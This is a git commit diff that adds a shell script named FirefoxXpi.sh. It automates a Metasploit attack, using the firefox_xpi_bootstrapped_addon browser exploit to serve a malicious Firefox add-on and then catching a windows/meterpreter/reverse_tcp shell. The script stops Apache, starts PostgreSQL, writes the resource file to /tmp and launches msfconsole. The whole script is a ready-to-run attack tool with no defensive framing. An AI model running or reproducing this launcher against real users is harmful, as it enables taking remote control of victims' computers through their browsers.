985e8247da64a06d115ea6420ba7a157a291b544
Falcon Rising <chinnidiwakar5@gmail.com>
2018-07-29 17:34:13 +0530

    Update FirefoxXpi.sh

--- FirefoxXpi.sh
+++ FirefoxXpi.sh
@@ -1,1 +1,26 @@
-zxd
+echo "Killing Troublesome Processes"
+echo "============================="
+echo "                             "
+echo "           done              "
+echo "                             "
+service apache2 stop
+echo "Starting Required Services"
+echo "============================="
+echo "                             "
+echo "           done              "
+echo "                             "
+service postgresql start
+IP=$(hostname -I)
+read -p "ENTER YOUR LPORT NUMBER : " PORT
+echo "IP BEING USED    : $IP"
+echo "PORT BEING USED  : $PORT"
+echo "use exploit/multi/browser/firefox_xpi_bootstrapped_addon" > /tmp/firefox.rc
+echo "set TARGET 1" >> /tmp/firefox.rc
+echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> /tmp/firefox.rc
+echo "set SRVHOST $IP" >> /tmp/firefox.rc
+echo "set SRVPORT 80" >> /tmp/firefox.rc
+echo "set URIPATH /" >> /tmp/firefox.rc
+echo "set LHOST $IP" >> /tmp/firefox.rc
+echo "set LPORT $PORT" >> /tmp/firefox.rc
+echo "exploit" >> /tmp/firefox.rc
+msfconsole -q -r /tmp/firefox.rc
